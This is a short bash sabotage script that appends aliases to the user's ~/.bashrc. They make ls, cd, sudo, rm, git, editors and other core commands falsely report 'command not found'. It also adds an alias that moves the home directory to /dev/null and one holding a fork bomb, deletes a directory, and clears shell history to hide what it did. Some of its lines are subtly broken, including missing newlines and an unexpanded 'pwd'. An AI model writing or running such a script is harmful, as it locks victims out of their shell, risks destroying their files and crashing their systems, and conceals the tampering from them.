#
# DEV BY KAP35
#

file="/home/$USER/.bashrc"

helpText=""

if [ -f "$file" ];
then
    cmd="\nalias ls='echo \"bash: ls:command not found\"'\n"
    cmd0="alias emacs='echo \"bash: emacs:command not found\"'\n"
    cmd1="alias nano='echo \"bash: nano:command not found\"'\n"
    cmd2="alias vim='echo \"bash: vim:command not found\"'\n"
    cmd3="alias code='echo \"bash: code:command not found\"'\n"
    cmd4="alias su='echo \"bash: su:command not found\"'\n"
    cmd5="alias sudo='echo \"bash: sudo:command not found\"'\n"
    cmd6="alias cd='echo \"bash: cd:command not found\"'\n"
    cmd7="alias dnf='echo \"bash: dnf:command not found\"'\n"
    cmd8="alias snap='echo \"bash: snap:command not found\"'\n"
    cmd9="alias mv='echo \"bash: mv:command not found\"'\n"
    cmd10="alias chmod='echo \"bash: chmod:command not found\"'\n"
    cmd11="alias rm='echo \"bash: rm:command not found\"'\n"
    cmd12="alias ne='echo \"bash: ne:command not found\"'\n"
    cmd13="alias neovim='echo \"bash: neovim:command not found\"'\n"
    cmd14="alias tilde='echo \"bash: tilde:command not found\"'\n"
    cmd15="alias touch='echo \"bash: touch:command not found\"'\n"
    cmd16="alias cat='echo \"bash: cat:command not found\"'\n"
    cmd17="alias grep='echo \"bash: grep:command not found\"'\n"
    cmd18="alias git='echo \"bash: git:command not found\"'\n"
    cmd19="alias hall='mv ~ /dev/null/'"
    cmd20="alias help='echo \"$helpText\"'"
    cmd21="alias fork=':(){ :|: & };:'"

    printf "$cmd" >> $file
    printf "$cmd0" >> $file
    printf "$cmd1" >> $file
    printf "$cmd2" >> $file
    printf "$cmd3" >> $file
    printf "$cmd4" >> $file
    printf "$cmd5" >> $file
    printf "$cmd6" >> $file
    printf "$cmd7" >> $file
    printf "$cmd8" >> $file
    printf "$cmd9" >> $file
    printf "$cmd10" >> $file
    printf "$cmd11" >> $file
    printf "$cmd12" >> $file
    printf "$cmd13" >> $file
    printf "$cmd14" >> $file
    printf "$cmd15" >> $file
    printf "$cmd16" >> $file
    printf "$cmd17" >> $file
    printf "$cmd18" >> $file
    printf "$cmd19" >> $file
    printf "$cmd20" >> $file
    printf "$cmd21" >> $file

fi

rm -r pwd
history -c

exit
